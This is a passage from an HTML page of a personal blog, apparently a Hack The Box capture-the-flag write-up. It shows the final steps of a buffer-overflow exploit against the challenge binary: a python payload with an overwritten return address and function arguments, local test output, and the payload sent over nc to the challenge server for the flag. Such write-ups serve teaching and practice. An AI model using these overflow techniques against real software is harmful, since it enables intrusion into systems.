+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�ﾭ�
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Note that it did not work correctly. This is because we need to pass the <code class="language-plaintext highlighter-rouge">param1</code> and <code class="language-plaintext highlighter-rouge">param2</code> as function parameters. In order to pass them as a parameter, we need to populate the EIP register with an address. This address can essentially be anything, but its size in bytes matter. The final payload would then be:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb :<span class="o">(</span> <span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'A'*188 + b'</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + b'mula</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">c0')"</span> <span class="o">&gt;</span> payload2.bin
+<span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">cat </span>payload2.bin | ./vuln
+You know <span class="nb">who </span>are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
+hi mom
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</code></pre></div></div>
+
+<p>As we can see, we now print the value of the <code class="language-plaintext highlighter-rouge">flag.txt</code>. This adjustment was made such that it would align the stack for the <code class="language-plaintext highlighter-rouge">flag</code> function to understand our paramters.</p>
+
+<p>Let’s try in the server now!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>^C<span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">cat </span>payload2.bin - | nc 167.99.82.136 31987
+You know <span class="nb">who </span>are 0xDiablos: 
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
+HTB<span class="o">{</span>redacted<span class="o">}</span>
+</code></pre></div></div>
+<p>And there is our flag!</p>
+
+<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>
+
+<p>In this CTF, we learned a lot more about reverse engineering, GDB and how to exploit a simple buffer overflow. As we can see, reverse engineering exploitation is extremely hard and troublesome, even in its simpler form.</p>
+
+<p>I hope you learned something knew today, and as always, never forget to do your <strong>research</strong>!</p>
+
+<p><a href="/">Go back</a></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
